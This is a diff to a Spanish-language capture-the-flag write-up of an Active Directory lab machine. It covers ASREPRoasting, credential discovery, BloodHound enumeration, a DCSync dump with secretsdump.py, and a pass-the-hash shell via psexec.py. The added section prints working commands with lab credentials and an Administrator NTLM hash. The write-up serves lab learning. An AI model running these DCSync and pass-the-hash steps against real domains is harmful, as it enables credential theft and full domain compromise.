@@ -1,6 +1,18 @@
 ## Resumen
-
+Sauna es una máquina Windows de dificultad fácil que incluye enumeración y explotación de Active Directory. Los posibles nombres de usuario se pueden derivar de los nombres completos de los empleados que aparecen en el sitio web. Con estos nombres de usuario, se puede realizar un ataque ASREPRoasting, que genera un hash para una cuenta que no requiere preautenticación Kerberos. Este hash se puede someter a un ataque de fuerza bruta sin conexión para recuperar la contraseña en texto plano de un usuario que pueda acceder al servidor mediante WinRM. Al ejecutar WinPEAS, se revela que otro usuario del sistema está configurado para iniciar sesión automáticamente e identifica su contraseña. Este segundo usuario también tiene permisos de administración remota de Windows. BloodHound revela que este usuario tiene el derecho extendido DS-Replication-Get-Changes-All, lo que le permite extraer hashes de contraseñas del controlador de dominio en un ataque DCSync. La ejecución de este ataque devuelve el hash del administrador de dominio principal, que se puede utilizar con psexec.py de Impacket para obtener una shell en el equipo como NT_AUTHORITY\SYSTEM.
 ### Herramientas
+
+- Nmap
+- Gobuster
+- Smbmap
+- Kerbrute
+- GetNPUsers
+- Hashcat
+- Evil-winrm
+- Winpeas
+- Bloodhound
+- Secretsdump
+- Psexec
 
 ## Escaneo y enumeración
 Hacemos nuestro escaneo de puertos hacía la IP buscando los abiertos TCP y encontramos algunos que pueden ser de utilidad como el 80, 88, 389, 445... Los cuales iremos investigando
@@ -117,3 +129,45 @@ Ahora procederemos a iniciar bloodhound para visualizar como está organizado el
 bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.29.44 -c All
 ``` 
 
+Iniciamos la base de datos de neo4j, cambiamos su contraseña y luego iniciamos desde la terminal bloodhound, importaremos los json en un archivo zip y en los nodos del usuario svc_loanmgr elegiremos Outboudn Object Control y veremos que tiene acceso a GetChanges y GetChangesAll para conseguir elevar privilegios
+
+```bash
+ $ bloodhound
+
+ Starting neo4j
+Neo4j is running at pid 108531
+
+ Bloodhound will start
+```
+
+
+![](Pasted%20image%2020260505183350.png) 
+
+
+Mirando en la rama de GetChanges podemos ver como se podría abusar para ejecutar el ataque, sería con un ataque de dcsync
+
+![](Pasted%20image%2020260505183549.png) 
+
+
+Para ello empezaremos usando la aplicación secretsdump de impacket y tendredemos accesos a los hashes de los usuarios en especial del Administrador
+
+
+```bash
+secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.129.29.44'
+``` 
+
+![](Pasted%20image%2020260505184003.png)
+
+
+
+Concluiremos con el escalado de privilegios usando psexec para abrir una shell con permisos de administrador en este caso, ya que sabemos el hash del propio usuario Administrator
+
+```bash
+./psexec.py Administrator@10.129.29.44  -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
+``` 
+
+![](Pasted%20image%2020260505184210.png) 
+
+Para finalizar encontraremos la última flag en su escritorio
+
+![](Pasted%20image%2020260505184317.png)
